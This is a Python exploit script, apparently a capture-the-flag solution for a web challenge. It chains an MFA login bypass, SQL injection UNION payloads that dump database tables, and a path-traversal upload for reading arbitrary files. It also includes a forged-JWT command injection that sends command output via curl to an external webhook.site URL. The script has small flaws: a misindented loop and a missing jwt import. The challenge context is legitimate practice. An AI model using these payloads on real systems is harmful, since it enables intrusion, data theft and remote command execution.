import requests
import base64
import json
import secrets

url = "http://start.wpctf.lan:8806/{path}"

def _(path):
    return url.format(path=path)

class Challenge:
    def __init__(self):
        self.s = requests.Session()
        self.login()

    def login(self):

        mfa_check = _(path="/api/mfa_verify.php")
        response = self.s.post(
            mfa_check, json={"mfa_check": 123, "username": "admin7321034747"}
        )

        self.jwt = response.json()["jwt"]
        self.s.headers.update({"Authorization": "Bearer " + self.jwt})

    def get_userid(self, id):
        self.login()
        response = self.s.get(_(path=f"/api/users.php?id={id}"))
        return response.text

    def get_username(self, name,full_name):
        self.login()
        response = self.s.get(_(path=f"/api/users.php?name={name}&full_name={full_name}"))
        return response.text

    def write_file(self, path):
        name = secrets.token_hex(16)
        max = 512
        base_a = "a/../"
        back = "../../../../../.."
        pad = base_a * ((max - len(path) - len(back)) // 5 - 1)
        pad += "A" * ((max - len(path) - len(back)) % 5) + base_a

        c_path = pad + back + path
        # add writable path to bypass security check
        full_path = f"{c_path}../../../../../../../var/www/html/uploads/13455/prova"
        

        response = self.s.post(
            _(path="/api/fileupload.php"),
            files={"file": (name, open("test.png", "rb"))},
            data={"group_id": full_path},
        )
            for file in self.list_files():
            if file.get('name') == name:
                id = file.get('id')
                response = self.s.get(_(f'/api/files.php?id={id}'))
                if response.ok:
                    print("FOUND: ", name)
                    return response.text
        return "Not found"

    def list_files(self):
        response = self.s.get(_(path='/api/files.php'))
        return response.json()
    
    def rce(self, cmd):
        JWT_SECRET = "WP{fr0m_bl4ckb0x_2_wh1t3b0x}"
        WEBHOOK = "https://webhook.site/b217b4bf-6acc-4ab2-903c-a3ada20363fd"
        group_id = f';  curl -X POST -d "$({cmd})" {WEBHOOK}'
        payload_jwt = {
            "user_id": 928476593,
            "user": "sadf",
            "pass": "asd",
            "full_name": "WP{R00t_Sm1th}",
            "group_id": group_id,
            "permissions": {
                "upload": "1",
                "listFiles": "1",
                "deleteFiles": "1",
                "listUsers": "1",
                "download": "1",
            },
        }
        jwt_asfd = jwt.encode(payload_jwt, JWT_SECRET, algorithm="HS256")
        
        self.s.headers.update({"Authorization": "Bearer " + jwt_asfd.decode()})
        self.s.get(_(path="/api/filesdownloadall.php"))

    

def injection(inj):
    r = c.get_username("admin238\\'", f"OR 1=1 UNION SELECT 1337,9001,({inj}),420,69,42 --")
    j = json.loads(r) 
    j = j['user'][3]['pass']
    l = j.split(",")
    l = [" ".join(x.split("1337")) for x in l]
    print("\n".join(l))
    
c = Challenge()

# Leak users table
# print(c.get_username("admin238\\'", "OR 1=1 -- "))

# Leak all tables
# injection("SELECT group_concat(concat(table_schema,1337,table_name,1337,column_name,1337,data_type,1337,CHARACTER_MAXIMUM_LENGTH)) FROM information_schema.columns")

# Leak all logs
# injection("SELECT group_concat(concat(id,1337,ip,1337,url,1337,method,1337,accessed)) FROM access_logs")

# Leak @@GLOBAL.sql_mode
# c.get_username("admin238\\'", f"OR 1=1 UNION SELECT 1337,9001,(SELECT @@GLOBAL.sql_mode),420,69,42 --")

# File read
'''
while True:
    fname = input("filename:")
    print(c.write_file(fname))
'''

# RCE 
'''
while True:
    cmd = input("command:")
    c.rce(cmd)
'''

